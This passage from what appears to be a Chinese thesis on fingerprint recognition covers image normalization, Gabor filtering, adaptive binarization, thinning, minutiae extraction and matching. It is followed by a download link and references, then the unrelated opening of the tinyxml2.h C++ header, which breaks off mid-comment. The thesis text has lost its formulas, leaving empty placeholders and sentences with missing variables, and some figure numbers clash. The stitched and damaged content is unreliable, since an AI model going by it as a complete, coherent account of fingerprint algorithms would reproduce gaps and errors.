在使用方差均值法之前还要使用归一法将图变为低频图。归一化的目的是把不同原图像的对比度和灰度调整到一个固定的级别上，为后续处理提供一个较为统一的图像规格。指纹图像的归一化公式如式(3.3)所示，当大于平均值时为加。



公式
编号





（3.3）


其中和为期望的灰度均值和方差。
均衡化后效果如下图所示：

图3-2 增强对比度前后效果
3.4 Gabor滤波增强
众所周知，Gabor滤波器是带通滤波器，它以其在空域良好的方向选择性在频域有良好的频率选择性而在计算机视觉领域尤其纹理分析方面得到了广泛的应用。在指纹图像中对于灰度指纹图像，脊线和谷线在局部的小邻域可以认为是正弦波形状，具有一定的频率和方向。
利用Gabor滤波器良好的对方向和频率的选择性方向滤波是图像增强的一个很好的方案，实验表明，以Gabor函数的偶分量实部为模板，脊线于谷线形成的近似正弦波的频率为滤波器的频率，以指纹的局部方向构建的滤波器，去噪效果非常好，滤波后的指纹图像的灰度直方图以呈现明显的双峰性质。
Gabor滤波器的形式如下图所示：

图3-3 Gabor滤波器
滤波后的图像灰度值为：

图3-4 灰度值计算式
Gabor滤波增强后的效果图如下所示：

图3-5 Gabor增强局部效果图
3.5 对指纹图像进行二值化处理
由于分割后的图像质量仍然不是很好，所以需要对其进行滤波、消除毛刺、空洞处理和二值化处理，以使指纹图像清晰，消除不必要的噪声，以利于进一步的辨识。
指纹图像二值化作为指纹预处理过程的一部分，是进行指纹图像细化处理的基础。目前指纹细化方法都是基于二值指纹图像进行的。对指纹图像二值化的好处在于使得图像的几何性质只0和1的位置有关，不再涉及像素的灰度值，使处理变得简单，这给存储和处理带来了很大的方便，同时也提高了系统的经济实用。一个好的算法可以得到一个高质量的二值图像。反之，如果该阶段引入噪声，就会直接降低图像质量，影响识别精度。对指纹图像进行二值化，其基本要求就是二值化后的图像能真实地再现原指纹。具体要求为：
1．脊线中不出现空白；
2．二值化后的脊线基本保持原来指纹的特征；
3．指纹的纹线不应有太多的间断和相连；
4．指纹纹线间的间距应大致相同。
指纹图像首先要进行中值滤波处理，去除噪声。然后进行二值化过程，变成二值图像。由于原始指纹图像不同区域深浅不一，如对整幅图像用同一阈值进行二值分割，会造成大量有用信息的丢失。这里我们使用自适应阈值二值化的思想，对每块指纹图像，选取的阈值应尽量使该块图像内大于该阈值的像素点数等于小于该阈值的像素点数。
一般灰度图像二值化的变换函数用下列公式表示，见式（3.4）：



公式
编号





（3.4）


公式(3.4)中为指定的阈值，为灰度值。
自适应阈值算法[9]首先是利用固定阈值算法的思想，然后根据图像中每一部分的明暗度来调整阈值。本文首先把图像分为若干个的方块，每一块根据自己的阈值进行二值化。这种算法充分利用了指纹图中脊线与谷线宽度大致相同的特点，即二值化后黑白像素的个数也应大致相同，首先利用固定阈值算法的特点对指纹图像中的每块确定一个大致的阈值，然后再利用自适应的思想对阈值进行准确的调整，即阈值的取值合适时图像是最光滑的，既没有“黑洞”阈值过大，也没有“白点”阈值过小，所以0－1之间的转换次数最少。下面为块区域阈值的选取算法：
1．将指纹图像划分为不重叠的大小为的块，求取该区域内所有像素的灰度平均值。在综合考虑算法速度和处理效果两方面的条件下，本文分块尺寸为8×8；为块的灰度平均值．见式（3.5）：



公式
编号





（3.5）



自适应阈值二值化的流程图如图3-6所示：

图3-6 自适应阈值二值化流程图

3.6 指纹图像的细化
细化是在不改变图像像素拓扑连接关系的条件下，连续擦除图像的边缘像素，把纹线粗细不均匀的指纹图像转化成线宽仅为一个像素的条纹中心线图像的过程。细化可以去除不必要的纹线粗细信息，使得指纹图像的数据量及连接结构更加突出，便于从指纹图像中提取细节特征，如图3-7从而在指纹特征提取和匹配环节上提高图像的处理速度和效率。

图3-7 纹线特征
指纹图像二值化后，纹线仍具有一定的宽度，而指纹识别只对纹线的走向感兴趣，不关心它的粗细。为了进一步压缩数据，得到更精确的细节特征，提高识别的准确性，对指纹图像进行细化处理是不可忽略的。
细化方法不同,细化结果就有差异。在指纹识别中要求在不改变原来指纹图像的拓朴连通性的同时,细化的结果应为严格的八邻域图像骨架;纹线中除去特征点以外,每个像素均只与相邻两个像素为八邻域,抹去任意一像素都将破坏纹线的连接性。概括起来说就是纹线细化处理要满足收敛性、连接性、拓朴性、保持性、细化性、中轴性、快速性的要求。
目前为止,关于细化方法的研究工作已有很多成果,所采用的方法从使用的观点来看,比较多的是采用模板匹配的方法(如迭代法、OPTA单连通法等)。这种方法是根据某个像素的局部邻域(如3×3,5×5等)的图像特征对其进行处理,此外也有采用边缘搜索编码、外轮廓计算以及神经网络等细化方法。从处理的过程来看,主要可以分为串行和并行两类,前者对图像中当前像素处理依据其邻域内像素的即时化结果,且不同的细化阶段采用不同的处理方法;后者对当前的像素处理该像素及其邻域内各像素的前一轮迭代处理的结果,自始至终采用相同的细化准则。
对于任意形状的区域，细化实质上是腐蚀操作的变体，细化过程中要根据每个像素点的八个相邻点的情况来判断该点是否可以剔除或保留。

图3-8 根据某点的八个相邻点的情况来判断该点是否能删除
图3-8给出了当前需要处理的像素点在不同的八邻域条件下的情况，可以看出：
(1)不能删，因为它是个内部点，我们要求的是骨架，如果连内部点也删了，骨架也会被掏空的；
(2)不能删，和(1)是同样的道理；
(3)可以删，这样的点不是骨架；
(4)不能删，因为删掉后，原来相连的部分断开了；
(5)可以删，这样的点不是骨架；
(6)不能删，因为它是直线的端点，如果这样的点删了，那么最后整个直线也被删了，剩不下什么；
(7)不能删，因为孤立点的骨架就是它自身。
总结上图，有如下的判据：
(1)内部点不能删除；
(2)孤立点不能删除；
(3)直线端点不能删除；
(4)如果P是边界点，去掉P后，如果连通分量不增加，则P可以删除。
我们可以根据上述的判据，事先做出一张表，从0到255共有256个元素，每个元素要么是0，要么是1。我们根据某点的八个相邻点的情况查表，若表中的元素是1，则表示该点可删，否则保留。查表的方法是，设白点为1，黑点为0；左上方点对应一个8位数的第一位（最低位），正上方点对应第二位，右上方点对应的第三位，左邻点对应第四位，右邻点对应第五位，左下方点对应第六位，正下方点对应第七位，右下方点对应的第八位，按这样组成的8位数去查表即可。考虑当前像素点的各种八邻域的情况，我们可以得到一个细化操作查找表，该表在下面的细化算法中详细介绍。
为了避免分裂指纹图像，细化的过程分为两个步骤，第一步是正常的腐蚀操作，但是它是有条件的，也就是说那些被标记的可除去的像素点并不立即消去；在第二步中，只将那些消除后并不破坏连通性的点消除，否则的话保留这些边界点。以上的步骤是在一个3×3邻域内运算，可以通过查表实现细化的操作。算法的实现步骤如下：
(1)定义一个3×3模板和一个查找表，模板和查找表分别如表3.1和图3.9所示：
表3-1 细化模板



1
2
4




128
256
8


64
32
16



图3-9 细化查找表
(2)对二值图像从上到下、从左到右进行扫描；该过程结束后再对图像进行从左到右，从上到下的扫描；如果图像中当前像素点的灰度值为"0"，且其左右（第一次扫描过程考虑左右像素点）或上下（第二次扫描过程考虑上下两个像素点）两个像素点中有任意一个为"255"则转至步骤(3)，否则回转到步骤(2)；
(3)该像素点为中心的3×3区域内的各个像素值和定义的模板中的权值进行卷积求和，得到查找索引值k；
(4)根据这个索引值k得到表里相应的数据，如果为"1"，那么该像素点的灰度值设为"255"，如果为"0"，则该像素点的灰度值为"0"。
(5)图像从头至尾扫描二遍后，如果该次扫描修改了图像中的点，则跳转至步骤二，开始新的一轮扫描。否则图像细化结束。

图3-10 细化处理后的指纹图像
图3-10是一幅经过细化处理后的指纹图像，和原图像比较可知，细化后的指纹图像脊线的宽度由5到8个像素被压缩到一个像素，以便于后续特征提取的处理过程能够对脊线的断点和分叉点进行精确定位。
3.7 预处理实验结果



a
b








原始图像（a－1）
原始图像（b－1）


图3－11 原始图像



a
b








分割图像（a－2）
分割图像（b－2）


图3-12 分割后的图像



a
b








二值化图像（a－3）
二值化图像（b－3）


图3－13 二值化后的图像



a
b








细化图像（a－4）
细化图像（b－4）


图3－14细化后的图像
3.8 本章小结
本章主要介绍了指纹图像预处理各个步骤的原理及实现，对各步骤的算法进行研究与实现，给出了各个算法的结果。在指纹分割的处理中采用了灰度方差发进行分割运算，得到了很好的效果，在细化的处理中采用了查表的方法进行细化并且比以往的常规算法要优越一些。

第四章 指纹特征的提取
对于特征点提取的常用算法很多，如：
(1)基于二值化的特征提取方法：这种算法对于预处理和增强后得指纹图像进行二值化，然后再提取特征点。
(2)基于直接灰度的特征提取方法：这种方法直接从灰度图像出发，通过分析图像的纹理属性和拓扑结构提取特征点。
(3)基于细化图像的特征提取方法：这种方法是将指纹图像处理后得到细化图像，通过细化图像提取特征点。
为了比较两个指纹是否相同，需要从指纹图像中提取出能表示指纹唯一性的特征。Galton提出的指纹细节点是人工指纹匹配中最常用的特征。目前已定义的特征类型己达150多种，但是这些扩展的特征往往不易提取相互区分，并且它们都可以由端点和分叉点的组合进行描述，这使得端点和分叉点成为最常用的结构特征，也称为细节特征，它被认为是最稳定、最容易检查的，而且占全部特征点的80％以上。提取出的特征点还必须经过伪特征点的去除，尽可能地去除掉由于二值化、细化处理等过程引入的伪特征点。最后确定出特征点的类型、位置、方向。
本章就是根据端点和分叉点是最常用的结构特征，提取满足一定条件接近的点，再去除不是端点和分叉点的伪特征点，最终实现特征值的提取，有利于后面匹配的展开。
4.1 特征点的提取
特征提取一般是指提取指纹图像的局部特征，也就是细节点特征。在基于细节点的指纹自动识别系统中，特征提取是在细化后的指纹图像上进行的。
特征提取的首要问题是确定细节点和它的位置，细节点的位置和细节点间的相对位置很重要，尽管每个指纹中包括将近80个细节，只要确定十几个细节点就己经足够用来识别了。
探测细节点的算法很简单， M是待检测的点，是它的八邻域，沿顺时针方向排列。是细化后图像在处的灰度。如果M是端点，则它的八邻域满足：



公式

编号






（3.13）


如果M是分叉点，则它的八邻域满足：



公式

编号






（3.14）


这样我们就可以在细化后的图像中找到细节点(端点和分叉点)，并记录它们在图中的相对位置。

图4-1 指纹图像特征点提取结果
4.2 假特征点的去除
这样得到的特征中存在由指纹质量、摄入噪声等原因造成的很多假特征，如下图3-12所示(a)和(b)中产生了假的端点；©和(d)中形成了错误的断开和连接；(e)中显示的是一个由不平滑的脊引起的毛刺，出现了假端点和假分叉两种特征：(f)~(g)是几种错误连接的例子，分别称为桥形、三角形、梯形结构。

图4-2 伪特征点
造成伪特征的原因有很多，指纹提取、二值化及细化等过程均可能引入伪特征。伪特征的存在将影响指纹的比对，降低识别率．(1)伪特征的分析。对于取端点及叉点作为特征算法，伪特征主要指图4-1中所示的几种种：毛刺；假桥；岛屿；断脊；短脊。对于这些伪特征的消除，文献[10]提出了基于纹线跟踪的后处理方法，文献[13]提出了基于知识的指纹后处理方法，将指纹后处理与指纹原灰度图联系了起来，文献[14]提出了基于统计与结构的指纹后处理方法。
分析这几种种伪特征，它们带来的伪特征点总是成对在近距离内出现而且除断脊外均有短脊线相连接。毛刺、短脊及岛屿均为从一个特征点出发经过很小的步长到达另一个特征点，可以采用沿脊线搜索特征点的方法去除伪特征对。假桥、断脊则要考虑伪特征的角度关系。
伪特征的去除，由于提取的特征集合P(P1，P2．．．，P n)全为端点与叉点，端点的伪形态有毛刺端点、短脊端点与断脊端点；叉点的伪形态有毛刺叉点、假桥叉点与岛屿叉点。我们可以分别从端点与叉点出发搜索其邻域，判断其真伪，全部伪特征被分为伪端点与伪叉点予以去除。根据上面的分析，伪特征可按如下规则去除：


① 去除孤立点与边界点，边界点定义为掩膜值为0的任何区域的距离小于阈值的特征点。


② 对于各端点Pi，从该特征点出发沿脊线搜索，若经过很小的步长到达另一个特征点即搜索到一个脊线点满足C n§!=2或S n§!=2则分别当作短脊、毛刺所带来的伪特征点予以去除；若该端点不是毛刺、短脊引起的伪端点，则搜索其邻域是否有端点Pj满足Pi与Pj之间没有脊线，A与Ai或Aj的差小于30°即<30°或<30°，据此来判断该端点是否为断脊。


③ 对于各叉点Pi，从该特征点出发沿脊线搜索其中一个分支，若有两个分支经过很小的步长均到达同一个叉点则当作岛屿予以去除；若有一个分支经过很小的步长到达另一个叉点P且满足70°<110°或70°<<110°，则可当作假桥剔除；若有一个分支经过很小的步长到达另一个端点Pj则可当作毛刺剔除。



第五章 指纹图像的匹配与实验结果
5.1 指纹图像匹配方法简介
指纹匹配要解决的是对两幅给定指纹图像的特征模式进行比对，判断这两幅图像是否来自同一个人的同一手指。指纹匹配是自动指纹识别的最后一步，也是非常关键的一步。
指纹图像匹配方面，主要有基于图像，脊线结构和特征点的方法。基于特征点的匹配算法具有简单、快速、鲁棒性等优点。目前最为常用的方法是FBI提出的细节点坐标模型来做细节匹配。它利用脊线上的端点和分叉点这两种关键点来鉴定指纹。通过将细节点表示为点模式，一个指纹识别问题可以转化为一个点模式匹配问题。点匹配算法是通过某些变换，如平移变换、旋转变化、伸缩变换，可以把两个点集中的对应点匹配起来。对于基于细节点的匹配思路大体分两种：基于直角坐标系的特征识别和基于极坐标系的特征识别。
点模式匹配将注册指纹和待识指纹的特征点定义为两个点集和P和Q通过平移和旋转使得两个点集重合点数最多。点模式匹配是著名的数学难题。目前的指纹识别系统主要采用基于节点的匹配方法，即点模式匹配。从模板指纹和输入指纹中选取一个节点作为参考节点对，在进行节点匹配时先利用基准点将指纹对齐，然后再评估其它节点的匹配程度。很多情况下选用图片的中心点。当然，他所带来的难题有：

(1) 如何快速找到基准点把两幅指纹对齐。
(2) 图片A中有图片B中不存在的点，集合B中也有图片A中不存在的点，匹配的时候如何处理这些点。
(3) 由于指纹存在变形位移，任何一对匹配点之间都不是绝对相等，而是存在一定的差距。设计算法的时候，必须要有一定的容错能力。
(4) 最终得到的是两幅指纹的相似度，怎么确定相似度的计算方式。
另外，计算匹配的时间即效率性也很重要。参考点在指纹图像的识别中是也至关重要的。能获得参考点表明从被识别图像中获得的任意比特流与登记图像中获得的比特流相近，则有可能得出两图像相同的结果；没有参考点表明被识别图像完全是另一不同图像。

5.2 本文的匹配方法
指纹匹配是模式识别中的一个有名的难题。它是对于两个含有不同数量的点集 和，如何找出它们之间的匹配关系。因此，一个好的指纹匹配算法应该能够有效地解决两个点集间的几何不变量问题。人们对一般的指纹匹配提出很多算法，比如松弛算法，其中有的文献只处理了点模式间因平移带来的偏差；也有文献处理了因平移和旋转带来的误差；另外有文献不仅考虑到位移和旋转误差，还处理了因伸缩尺度不同而带来的误差。
指纹图像匹配中的两个点集和，其中从第一幅图像抽取，有个特征点构成，从第二幅图像抽取，有个特征点构成，即和。因为在实际应用中，点的相对位置存在误差，所以它们之间的匹配就是对每一个特征点分别提取再相对于中心点取得的向量进行比对的过程，使两个点集有最大数量点对之间存在稳定的一一对应关系。
对于点集中的特征点，这里用方向和方向的坐标来描述，指纹图像每一特征点是一个五维向量，其中分别是该点的坐标位置，是特征点相对于中心点的方向向量，为特征点的类型(即是分叉点还是端点)，为特征点相对于中心点的距离向量。
可以通过一些合适的算法，通过在一定范围搜索参数空间，计算其匹配支持数，也就是在该参数空间里，有多少指纹对匹配。当匹配支持数最大时，也就得到了所需要的结果。
算法步骤：
（1）分别读取两个特征点集合中的特征点；
（2）对特征点进行分类。定义取“1”时，属于特征点端点分类，取“2”时，属于特征点分叉点分类；
（3）分别计算他们相对于中心点的方向向量和距离向量；
（4）若两特征点的距离向量之差小于“2”且梁特征点的方向向量小于等于，则认为两特征点匹配；
（5）若不满足（4）的条件则认为不匹配，并删除。
一般能找到13个相同的特征就可以认为这两个指纹出自同一个手指，但从匹配来看，平均50个特征匹配点会有3～4个误配，于是将成功匹配点设置为>30个，认为是出自同一个手指。
匹配成功的特征点：端点用红色‘o’标注，分叉点用绿色标注‘o’。
5.3 实验结果
提取细化后图像的中心点，用 ‘o’标注。如图5－1所示：



a
b








提取中心点（a－１）
提取中心点（b－１）


图5－1 提取中心点后的细化图像
指纹图像细化处理后，标注特征点和中心点。特征端点用’o’标注，特征分叉点用’+‘标注，中心点用’*'标注。如图4-2所示：



a
b








特征提取图像（ｃ－2）
特征提取图像（ｄ－2）


图5－2特征点提取后的图像
一般能找到13个相同的特征就可以认为这些指纹出自同一个手指，但从匹配来看，平均50个特征匹配点会有3～4个误配，于是将成功匹配点设置为>30个，认为是出自同一个手指。匹配成功的特征点：端点用红色’o’标注，分叉点用绿色标注’o’。如图5－3所示：

图5-3 匹配后的图像

第六章 展望
6.1 系统结果及总结
本论文完成了指纹识别算法的设计与一个简单的实现，该算法主要分为三大
部分：

指纹图像的预处理、
指纹特征提取
指纹图像的匹配(比对)。

指纹图像预处理过程主要分为三个部分：
灰度图像方向图滤波去噪、图像二值化及图像细化三个部分。自适应二值化方法将灰度图像转化为二值图像，灰度图滤波去噪后，我们采用局部阈值取值的二值图像，在处理过程中，我们充分考虑到指纹图像的分布特点，对图像进行分块处理，设立动态阈值，细化过程我们分析邻域象素点的连通情况，采用逐层迭代的方法，对图像进行扫描，由周边向中间逐层细化，这样大大加快了处理速度，降低了处理的复杂性，同时细化之后，对细化图像再进行去噪。
整个预处理过程结果如下图6-1所示：

图6-1
指纹的特征提取主要提取脊线端点和分叉点两种细节特征及它们的位置。首先通过脊线跟踪将每一条脊线上的所有像素点按顺序编为一组，提取出端点和分叉点；
然后，根据端点和分叉点的拓扑特点，去除伪特征点。考虑到输入的指纹图像存在着不可避免的平移、旋转、伸缩、扭曲，为了提高细节信息的可靠性，本文是求出细节特征点的相对中心点的相对位置和角度进行匹配。
匹配结果如下图6-2所示：

图6-2
6.2 下一步工作
在本次设计中，我发现指纹识别系统的设计过程中还存在着一些较难解决的瓶颈问题，阻碍了指纹识别系统的应用和普及。今后指纹识别整体的研究方向主要致力于解决这些问题，提高系统的识别率。这些问题如下：
1)指纹方向图(或方向场)的求取。
预处理的结果主要依赖于方向图的估计和求取。由于指纹图像中存在奇异点(中心点和三角点)，在奇异点附近，方向的变化特别剧烈，此时要估计出正确的方向是有一定困难的。不仅如此，奇异点主要是利用检测方向场变化的剧烈程度实现的，而采用分区估计方向的方法有可能模糊方向场的这种剧烈变化，会对后面的奇异点检测造成一定的影响。此外，由于输入的指纹图像存在平移、旋转和尺度变化，而划分子块时并不考虑这种变化，因此同一个手指在不同时间获得的指纹图像，其所得到的方向场是不同的，这对后面的预处理过程、特征提取、指纹分类、指纹比对会产生巨大的影响。
2)细节特征的提取。
现有的几乎所有的细节提取算法的性能都严重依赖于输入的指纹图像的质
量。而由于诸多的因素(譬如，指纹表面的异常信息，胎记，偶然的污迹，取像
系统的问题等等)，指纹图像中并不是总有完整的脊的结构。因此，可靠的细节
提取算法不能假定有很好的脊的结构，而应该对指纹图像的质量有很好的容忍
性。
3)匹配算法中的若干问题。
在基于细节的空间坐标以及细节点的方向，也就是细节的空间相对位置关系
的匹配方法中，初始匹配位置的对齐，即如何确定基准点或者说是坐标原点的定
位问题，包括原点和方向；尽管分类以及细分子类已经大大减少了匹配时搜索的
范围，但是对于大规模的指纹库来说，仍然需要进一步缩小指纹匹配的搜索范围，
同时引入辅助识别的信息；在指纹采集的过程中，指纹图像存在非线性变形，如
何克服这种变形。
当然，指纹识别的识别率以及识别速度的提高还取决于指纹采集设备精度以及处理速度的提高，但是算法的优劣仍然是影响系统性能的关键因素。
6.3 展望
总的来说，本文在针对指纹识别的各个环节尤其是指纹图像的预处理进行了相当的探索工作，当然这只是一个开始，许多地方有待于进一步的研究改进，还有很多后续工作有待于完成，例如在指纹图像的特征匹配方面还有很多工作有待于完善。
指纹识别技术是国内外研究的热点问题，实现指纹识别系统的实时性、网络化、提高系统识别率是人们研究的目标。相信不久以后，指纹识别将广
泛应用于我们的生活，为人们提供更方便更快捷的服务。
全套资料下载链接
https://download.csdn.net/download/wangyaninglm/10957731
如有需要，请加群免费赠送

参考文献
[1] R Clarke．Human identification in information systems：Management challenges and public policy issues[J]．Info．Technol．Peopie，1994.7(4)：6~37．
[2] 张志涌．精通MATLAB 6．5版[M]．北京：北京航空航天大学出版社.2003.3．
[3] 乔治宏．基于细节结构的指纹特征提取及匹配算法研究[D][硕士学位论文]．北京：北京工业大学硕士学位论文.2004，5．
[4] 罗希平，田捷．自动指纹识别中的图像增强和细节匹配算法[J]．软件学报，2002.5.13(5)：946~956．
[5] Dario Maio，Member，IEEE，and Davide  Maltoni．Direct grayscale minutiae detection in fingerprints[J]．IEEE transactions on pattern analysis and machine intelligence，1997，19(1)：27~40．
[6] 王家文，曹字．图形图像处理[M]．北京：国防工业出版社，2004.5．
[7] 田捷，杨鑫．生物特征识别技术理论与应用[M]．北京：电子工业出版社，2005．
[8] 张显全，唐莹，郭明明．一种改进的指纹快速细化算法[J]．广西科学院学报，2006，22(4)：237~239．
[9] 刘文星，王肇圻，母国光．纹线跟踪及其在细化指纹后处理中的应用[J]．光电子,激光，2002，13(2)：184~187．
[10] 缪绍纲．数字图像处理——活用MATLAB[M]．成都：西南交通大学出版社，2001
[11] 徐晓明.指纹图像的预处理及特征提取[硕士学位论文]，大连：大连理工大学，2005
[12]苏彦华．Visual C++数字图像识别技术典型案例[M]．北京：人民邮电出版社，2004．
[13]0’ORMANl, NICKERSONJN. An approach to fingerprintfilter design[J]．Pattern Recognition，1989，22(1)：29~38．
[14]林国清，李见为，王崇文．指纹图像预处理方法的研究[J]．光电工程，2002，29(5)：56—58．
[15]回红，陈祥献，周泓，等．Gabor函数实现基于结构的指纹识别[J]．浙江大学学报(工学版)，2004，38(6)：712~716．
[16]郭桂容．模糊模式识别[M]．长沙：国防科技大学出版社，1993．
[17]Kalle Kava．Fingerprint Classification[J]．Pattern Recognition，1996，
29(3)：389~404．
[18] 沈学宁．从指纹的原灰度图像上识别细节特征[J]．模式识别与人工智能，I989，2(4)：53~57．
[19] 简兵．基于脊线跟踪的指纹图细节提取算法[J]．电路与系统学报，2001,6(3)：1~5．
2002，16(1)：53~67
[20]QingHan Xiao．Fingerprint Image Post—Processing：A Combined Sta—iistical and Structural Approach[J]．Pattern Recognition，1991，24(10)：985~992．
[21] 韩伟红．指纹自动识别系统中的预处理技术[J]计算机研究与发展，1997，34(2):913~920．
[22] 马笑潇．指纹自动识别系统中的关键技术—— 方向图[J]，重庆大学学报，2001，24(3).91~94．
[23]JAIN A K．FARROKHNIA．F．Unsupervised Texture Segmentation Using Gabor Filters[J]．Pattern Recognition，1991,24(12)：l167~1186，
[24] 赵书兰.MATLAB R2008数字图像处理与分析实例教程[M].北京:化学工业出版社.2009,6.







 
 
项目主页：http://grinninglizard.com/tinyxml2docs/index.html
 
 
tinyxml2.h
 
/*
Original code by Lee Thomason (www.grinninglizard.com)

This software is provided 'as-is', without any express or implied
warranty. In no event will the authors be held liable for any
damages arising from the use of this software.

Permission is granted to anyone to use this software for any
purpose, including commercial applications, and to alter it and
redistribute it freely, subject to the following restrictions:

1. The origin of this software must not be misrepresented; you must
not claim that you wrote the original software. If you use this
software in a product, an acknowledgment in the product documentation
would be appreciated but is not required.

2. Altered source versions must be plainly marked as such, and
must not be misrepresented as being the original software.

3. This notice may not be removed or altered from any source
distribution.
*/


#ifndef TINYXML2_INCLUDED
#define TINYXML2_INCLUDED

#if defined(ANDROID_NDK) || defined(__BORLANDC__) || defined(__QNXNTO__)
#   include <ctype.h>
#   include <limits.h>
#   include <stdio.h>
#   include <stdlib.h>
#   include <string.h>
#   include <stdarg.h>
#else
#   include <cctype>
#   include <climits>
#   include <cstdio>
#   include <cstdlib>
#   include <cstring>
#   include <cstdarg>
#endif

/*
   TODO: intern strings instead of allocation.
*/
/*
	gcc:
        g++ -Wall -DDEBUG tinyxml2.cpp xmltest.cpp -o gccxmltest.exe

    Formatting, Artistic Style:
        AStyle.exe --style=1tbs --indent-switches --break-closing-brackets --indent-preprocessor tinyxml2.cpp tinyxml2.h
*/

#if defined( _DEBUG ) || defined( DEBUG ) || defined (__DEBUG__)
#   ifndef DEBUG
#       define DEBUG
#   endif
#endif

#ifdef _MSC_VER
#   pragma warning(push)
#   pragma warning(disable: 4251)
#endif

#ifdef _WIN32
#   ifdef TINYXML2_EXPORT
#       define TINYXML2_LIB __declspec(dllexport)
#   elif defined(TINYXML2_IMPORT)
#       define TINYXML2_LIB __declspec(dllimport)
#   else
#       define TINYXML2_LIB
#   endif
#else
#   define TINYXML2_LIB
#endif


#if defined(DEBUG)
#   if defined(_MSC_VER)
#       // "(void)0," is for suppressing C4127 warning in "assert(false)", "assert(true)" and the like
#       define TIXMLASSERT( x )           if ( !((void)0,(x))) { __debugbreak(); } //if ( !(x)) WinDebugBreak()
#   elif defined (ANDROID_NDK)
#       include <android/log.h>
#       define TIXMLASSERT( x )           if ( !(x)) { __android_log_assert( "assert", "grinliz", "ASSERT in '%s' at %d.", __FILE__, __LINE__ ); }
#   else
#       include <assert.h>
#       define TIXMLASSERT                assert
#   endif
#   else
#       define TIXMLASSERT( x )           {}
#endif


#if defined(_MSC_VER) && (_MSC_VER >= 1400 ) && (!defined WINCE)
// Microsoft visual studio, version 2005 and higher.
/*int _snprintf_s(
   char *buffer,
   size_t sizeOfBuffer,
   size_t count,
   const char *format [,
	  argument] ...
);*/
inline int TIXML_SNPRINTF( char* buffer, size_t size, const char* format, ... )
{
    va_list va;
    va_start( va, format );
    int result = vsnprintf_s( buffer, size, _TRUNCATE, format, va );
    va_end( va );
    return result;
}
#define TIXML_SSCANF   sscanf_s
#elif defined WINCE
#define TIXML_SNPRINTF _snprintf
#define TIXML_SSCANF   sscanf
#else
// GCC version 3 and higher
//#warning( "Using sn* functions." )
#define TIXML_SNPRINTF snprintf
#define TIXML_SSCANF   sscanf
#endif

/* Versioning, past 1.0.14:
	http://semver.org/
*/
static const int TIXML2_MAJOR_VERSION = 3;
static const int TIXML2_MINOR_VERSION = 0;
static const int TIXML2_PATCH_VERSION = 0;

namespace tinyxml2
{
class XMLDocument;
class XMLElement;
class XMLAttribute;
class XMLComment;
class XMLText;
class XMLDeclaration;
class XMLUnknown;
class XMLPrinter;

/*
	A class that wraps strings. Normally stores the start and end
	pointers into the XML file itself, and will apply normalization
	and entity translation if actually read. Can also store (and memory
	manage) a traditional char[]
*/
class StrPair
{
public:
    enum {
        NEEDS_ENTITY_PROCESSING			= 0x01,
        NEEDS_NEWLINE_NORMALIZATION		= 0x02,
        COLLAPSE_WHITESPACE	                = 0x04,

        TEXT_ELEMENT		            	= NEEDS_ENTITY_PROCESSING | NEEDS_NEWLINE_NORMALIZATION,
        TEXT_ELEMENT_LEAVE_ENTITIES		= NEEDS_NEWLINE_NORMALIZATION,
        ATTRIBUTE_NAME		            	= 0,
        ATTRIBUTE_VALUE		            	= NEEDS_ENTITY_PROCESSING | NEEDS_NEWLINE_NORMALIZATION,
        ATTRIBUTE_VALUE_LEAVE_ENTITIES  	= NEEDS_NEWLINE_NORMALIZATION,
        COMMENT				        = NEEDS_NEWLINE_NORMALIZATION
    };

    StrPair() : _flags( 0 ), _start( 0 ), _end( 0 ) {}
    ~StrPair();

    void Set( char* start, char* end, int flags ) {
        Reset();
        _start  = start;
        _end    = end;
        _flags  = flags | NEEDS_FLUSH;
    }

    const char* GetStr();

    bool Empty() const {
        return _start == _end;
    }

    void SetInternedStr( const char* str ) {
        Reset();
        _start = const_cast<char*>(str);
    }

    void SetStr( const char* str, int flags=0 );

    char* ParseText( char* in, const char* endTag, int strFlags );
    char* ParseName( char* in );

    void TransferTo( StrPair* other );

private:
    void Reset();
    void CollapseWhitespace();

    enum {
        NEEDS_FLUSH = 0x100,
        NEEDS_DELETE = 0x200
    };

    // After parsing, if *_end != 0, it can be set to zero.
    int     _flags;
    char*   _start;
    char*   _end;

    StrPair( const StrPair& other );	// not supported
    void operator=( StrPair& other );	// not supported, use TransferTo()
};


/*
	A dynamic array of Plain Old Data. Doesn't support constructors, etc.
	Has a small initial memory pool, so that low or no usage will not
	cause a call to new/delete
*/
template <class T, int INITIAL_SIZE>
class DynArray
{
public:
    DynArray() {
        _mem = _pool;
        _allocated = INITIAL_SIZE;
        _size = 0;
    }

    ~DynArray() {
        if ( _mem != _pool ) {
            delete [] _mem;
        }
    }

    void Clear() {
        _size = 0;
    }

    void Push( T t ) {
        TIXMLASSERT( _size < INT_MAX );
        EnsureCapacity( _size+1 );
        _mem[_size++] = t;
    }

    T* PushArr( int count ) {
        TIXMLASSERT( count >= 0 );
        TIXMLASSERT( _size <= INT_MAX - count );
        EnsureCapacity( _size+count );
        T* ret = &_mem[_size];
        _size += count;
        return ret;
    }

    T Pop() {
        TIXMLASSERT( _size > 0 );
        return _mem[--_size];
    }

    void PopArr( int count ) {
        TIXMLASSERT( _size >= count );
        _size -= count;
    }

    bool Empty() const					{
        return _size == 0;
    }

    T& operator[](int i)				{
        TIXMLASSERT( i>= 0 && i < _size );
        return _mem[i];
    }

    const T& operator[](int i) const	{
        TIXMLASSERT( i>= 0 && i < _size );
        return _mem[i];
    }

    const T& PeekTop() const            {
        TIXMLASSERT( _size > 0 );
        return _mem[ _size - 1];
    }

    int Size() const					{
        TIXMLASSERT( _size >= 0 );
        return _size;
    }

    int Capacity() const				{
        return _allocated;
    }

    const T* Mem() const				{
        return _mem;
    }

    T* Mem()							{
        return _mem;
    }

private:
    DynArray( const DynArray& ); // not supported
    void operator=( const DynArray& ); // not supported

    void EnsureCapacity( int cap ) {
        TIXMLASSERT( cap > 0 );
        if ( cap > _allocated ) {
            TIXMLASSERT( cap <= INT_MAX / 2 );
            int newAllocated = cap * 2;
            T* newMem = new T[newAllocated];
            memcpy( newMem, _mem, sizeof(T)*_size );	// warning: not using constructors, only works for PODs
            if ( _mem != _pool ) {
                delete [] _mem;
            }
            _mem = newMem;
            _allocated = newAllocated;
        }
    }

    T*  _mem;
    T   _pool[INITIAL_SIZE];
    int _allocated;		// objects allocated
    int _size;			// number objects in use
};


/*
	Parent virtual class of a pool for fast allocation
	and deallocation of objects.
*/
class MemPool
{
public:
    MemPool() {}
    virtual ~MemPool() {}

    virtual int ItemSize() const = 0;
    virtual void* Alloc() = 0;
    virtual void Free( void* ) = 0;
    virtual void SetTracked() = 0;
    virtual void Clear() = 0;
};


/*
